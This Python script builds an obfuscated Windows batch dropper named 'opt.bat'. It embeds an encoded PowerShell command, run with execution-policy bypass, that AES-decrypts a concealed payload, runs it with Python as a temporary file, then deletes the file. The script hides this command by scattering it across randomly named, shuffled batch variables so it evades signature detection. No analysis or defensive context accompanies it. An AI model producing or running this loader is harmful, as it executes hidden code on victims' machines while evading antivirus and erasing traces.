from string import ascii_letters
from random import choices, shuffle

thing = 'powershell.exe -noprofile -ep bypass -EncodedCommand JABhAD0AWwBTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAEMAcgB5AHAAdABvAGcAcgBhAHAAaAB5AC4AQQBlAHMAXQA6ADoAQwByAGUAYQB0AGUAKAApADsAJABhAC4ASwBlAHkAUwBpAHoAZQA9ADIANQA2ADsAJABhAC4AQgBsAG8AYwBrAFMAaQB6AGUAPQAxADIAOAA7ACQAYQAuAE0AbwBkAGUAPQBbAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AQwByAHkAcAB0AG8AZwByAGEAcABoAHkALgBDAGkAcABoAGUAcgBNAG8AZABlAF0AOgA6AEMAQgBDADsAJABhAC4AUABhAGQAZABpAG4AZwA9AFsAUwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBDAHIAeQBwAHQAbwBnAHIAYQBwAGgAeQAuAFAAYQBkAGQAaQBuAGcATQBvAGQAZQBdADoAOgBQAEsAQwBTADcAOwAkAGEALgBLAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAFEAbAB1AEIASABEAFQAVgBRAHcAQwBpAEQARwB3AGoAOABNAFcAYgBqAEcAVQBDAEYAbQB2AFQAQQBpADgAeQBvAFUAZAA1AGgARwBFADkATgBQAHcAPQAnACkAOwAkAGEALgBJAFYAPQBbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJwA0AHoATQBPAE4AQQA5AGcAZAA5AFgATgBYAC8ANABBAHEAQQBQADgALwB3AD0APQAnACkAOwAkAGUAPQBbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJwBNAEEAYgBkAEMAbABvAEwAdwBUAHAARABWAEUAZQArAE0ARABBAGUASQB1AHIAZwBjAFcAZwBYAHQATAAxADgAZQA0AEoATABoAEIAWABpAEYALwBDAHgATABlAGYAUQA1AE8AWAAzAHUAOQAwAEMAawBPADYAKwBXAGUASQBYAGUAawArADcAZwBuAG8AagB6AG4AZQBSAHAAUwBhAHEATABCAEoANgA5AHoAMABsADAANABOAEUATgBsAFUAYwB0AG4ANABzADYAOQBSAHEANgBqAHUAaQBmAFUAcgBNAFAAbwBKAHMAeQB0AG4ARwBHAEQAaABTACsAOQBuAFMAYgBTADAAQwBaAFoAegBPAGYANgBzAHgATQBiAFgAMwBKADIAdQA1AEsAQgBRAFAAeQB4ADQAOAAzAHYAUABUADMAeQAyAFMATABIADgAdgBOAEgAMABkADMASQBYAFYAaQBqAHcASgBaAHEAcAA2AC8ARgBwADIAZwBPAHAAZwBpAGEAWgBFADIAegA2AEUAYgAvAG4AYgB5ADMAMwAwAG4AQgB5ADIAUAB3AGgAVwBYAGcAcAA5AC8AVwArAHAAUAAvAC8AQgBuAEMAZwB6AG8AbgBGAE8AYgBYADIASABNAHEAdABYAHEAVABxAGUAWQA2ADUAWQBjADgAQwB5ADEAdQBrAEkAYgBFAHAAeQBzAEMARgBsADkASABuAFMAVgBqADAAWAAyAGMAQQBtAEwAYQBDAHMATAB5AHEATQBRAFoAVQBRAGQARgBhAHcARwB3AFQAagBWAHAAdwA4AGsAWgB2AFMAdABMAC8AZwBhAHMARQBuAHkAUQA1AFcAUwA5AGEAZgBPAEEAegA5ADMAaAB1AG4AcwBRAFoANgB6AHIAWgA4AGgANwBUAEcAUwBCAHEAZQBvAG4AMgB6AHQAdQB4AHUAVgAvAE0AZABzADgATgArAE4AYgBpAHcASwB6AEwAdQAvAE8AcgBnAG0AKwBrAEwASgBrAE4ARQBCAFcANgB4AG4ANABmAG0AcgAyAGwATwBmAEgAbQBvAEsAWgBoAEQANQB0AE8ATwBjADYAaQBpAFoAVgBkAHQAOQBTAGUAaABpAHoAUwArAHgAMgBXAHQANgBOAGoARQBHADIANgBHAHQAagBDAHIAcQBlAFMASQAvAFYASQBJAEoAdgA0AEgANQBHAC8AWQB2ADAAbQBiAFUATAB1AFAAcABSAFIATQBUAHoAbwBFAFMALwBrAEsAcwBBAEEAWQBOACsAKwBzADYAWgBuADIAVwAxADYAOAB4ADcASQBTAGUAWgBvAGUAVwB1AEwALwB2AGMAWQAvAEYAMgBTAGsARgBBAGcAUQBFAGwANQB1AHEATAAyAEUAcQByAHYARgByAGEAKwB4AGoAVgBoAGUAMgBUAEQAbgBPADYANQBsAG0AVwBXAHAANwAwAG0AVgBWAHkAagBvAG8ANgBUADIASQBHAGcAaQA4AEwALwBtAGIAZABKADEAYgB6AHQAbgBnAGYAdQBxAGwAdwArAFMATwA1AGoAaQBJAHAAVwBJAHcAbwBXADEAOAB4AGkAMgBHAEYAWABoAFYAbQBhAGYARAA2AGkAbwBtAC8AVQBSAFMAVQB4AGYAUgBKACsAQwBpAHUAYwB6AHgAZwBCAHAAbwB4AHEARABpAEcAegBxAHAAOQA3ADQASwB0AHIASABiAGwASgArAHgAWABHAHAAUwBVAE4AeQBIADEAWABNAEMAUgByAEcAYQBmAGsAUABpAEcASgBWADAASwBvAGwASABnAC8AUQBaAGMAMABBAGEAWgBaAHEARQAzAEUAZQA3ADMATgAvAGMAMAA3AGIATABDAGkAOQBSAGgAcwBlAG0AcQBSAGMAbgB6AFMAVgA2AFAASQBNAHUAbABzAHgAUABQAEIAZwBKADIAWQBLAHYATgBmAFkAeQBXAGUAdgA3ADcAMgBzAHQAZwBsAGEAagBQAGcANwBLAE4AZgBnAEoAYgBuADYAZABWAHYAKwBGAHAATwB6AHkAMwBYAFEASwBKAGMALwA1AFYANwAvAGkAYgBHAGYAcgB0ADMALwBvAHgARwAwADgAbAA4ADYAUABDADIAdwBvAEkAUgB0AEEAMQBzADQAdQAvADMANwBDAEgAQQB2ADUAZwA2AFgATgBGAFoAbQArADIANgAwAGgAUwBVAHEAMQB3AC8AMgB1AC8ANQBuAEEAcQBIAEUAWgBuAFQATwBIAFYATQBUAEYAVwAxAEUAegBoADEAZwA1AEoAcABYAGgAawBlAFAARgBlAFIAdABZAFQANAB3AGkAaABkAHcAQgAwAFIATgBkAHYAMwA4AFgAOAAzAEkAdQAvAEEAZgB0AEcAWQBqAE0AeQBzAEsALwBqAE8ARwBQAFkAQgBaAE0ATgBCAHIALwBCAFUAVQBhAFUAYwB1AG8AYwA2AFUAYwB0AFIALwA5AG0ANgBBAFoAagBCAGkAbAAxAEsARAAzAHkAUgBvAEEALwBLAFMAWQBIAEUAdABhAG4AVAA1AE8ARwB1AFcAdwB1AEYAcgA1AGgAZQBXAGsAZQB4AHAAUwBIADQASwBkAHgAMABYADEAdwBYAHEAbABUADIANgBLAFcASwBFAHoAcABBAGgAdwAvAEoAQwBVAGcAWgBPAFUATAA3AGIAMQBDAGUARwB6AGEAWQBFAHgAbQBwAFYANABtAE0AcQA2AE0AZQBLAGcAagBPADIAUgBGAHMANgBsAEEAcwBrAHQAVwBlADMAcgByAHMAcQBMAFIAbgBmAGEAbAAyAEMAcABJAHcAUQA0AHEARQBFADYAMABTAHQANQA0AFMAYQBaAFcAVABTAFMASABlAEUAYQBHAEYAcABaAHUAVAB4AGoAMgBwAFYAMABJAEoAcgBXAGwASABzADcAaQB0AGgAawBUAEgAMwBOAEEAMwBNAHUAOAAzAEMAYgBqAG8AMgBYAFIATABnAC8AbQB0AEQAaABsAHUALwBtAEsAOABsAHQAeQBnADYAZwBsAEsAcgBZAEgANAB5AHoAZwBQAHgAOQAxAEwALwByAHoAZwA4AGMASABwADMAcQA5AFIAeABCAGcAYgByAEwATgBtAEEAYwBMAGcAdABqAEsAMgBYAEYASgBPADgARwBaAHIAVgBrAFMAbABKAEEALwBqAGwAdwBGAEoAaQBtAHgAKwBnAEEAQwA5AHcARABOAGkANAByAHoAYgBWAEYAQwBQAFkAVQBKAEUANgBNADAAdgBEADMAQQBhAEgAbgBJAEMANgBDAHIAUgBOAEUAMgBIADEAMABSAEIAZwBuAHgASgBrADEAQQBjAGMAcAB5AG0AKwArAEkAZABKACsATAAvAFYAeAAvAFIARQBRAEwAYgBiAHEATABkAHEAcQBmAFQAOABmADAARgA0AEoAdwAzAEUAVgBrAEcATQBkAHoAZwB6AE8AagBRADgARQBZAGoARgBiAEsAbABQADUAeAA2AGsAcgBwAGEATgB1AHMALwBKACsAbABJAGcAOABVADMAdQBuAHkAMAA5AFIAaABZAHkATwBxAHQASwBnAHEAZwAvAHQAeQBhAHQAUQA3AFoAdwAxAG4AUgBZAFAAcwBXAE4AZQBvAC8AZQBPAHYARQBxAC8ASgBNAD0AJwApADsAJABkAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYQAuAEMAcgBlAGEAdABlAEQAZQBjAHIAeQBwAHQAbwByACgAKQAuAFQAcgBhAG4AcwBmAG8AcgBtAEYAaQBuAGEAbABCAGwAbwBjAGsAKAAkAGUALAAwACwAJABlAC4ATABlAG4AZwB0AGgAKQApACkAKQA7ACQAZAB8AE8AdQB0AC0ARgBpAGwAZQAgAC0ARgBpAGwAZQBQAGEAdABoACAAIgAwACIAIAAtAEUAbgBjAG8AZABpAG4AZwAgAHUAdABmADgAOwBwAHkAdABoAG8AbgAgACIAMAAiADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAIgAwACIAIAAtAEYAbwByAGMAZQA7AA=='

def varname():
    return ''.join(choices(ascii_letters, k=10))

setcom1 = f"{''.join(choices(ascii_letters, k=50))}"
setcom2 = f"{''.join(choices(ascii_letters, k=50))}"
setcom3 = f"{''.join(choices(ascii_letters, k=50))}"

f = open("opt.bat", "w")
print("@echo off", file=f)
print("setlocal enabledelayedexpansion", file=f)
print(f'set "{setcom1}=t"', file=f)
print(f'set "{setcom2}=s"', file=f)
print(f'set "{setcom3}=!{setcom2}!e!{setcom1}!"', file=f)

setcom=f"!{setcom3}!"


def split_fours(s: str):
    for i in range(0, len(s), 10):
        yield s[i : i + 10]

mapping = {}
for val in split_fours(thing):
    proposed_var_name = varname()
    while proposed_var_name in mapping:
        proposed_var_name = varname()
    mapping[proposed_var_name] = val
    
var_order = list(mapping)
shuffle(var_order)

for v in var_order:
    print(setcom, f'"{v}={mapping[v]}"', file=f)
revmap = dict(map(reversed, mapping.items()))
for val in split_fours(thing):
    print(f"!{revmap[val]}!", end="", file=f)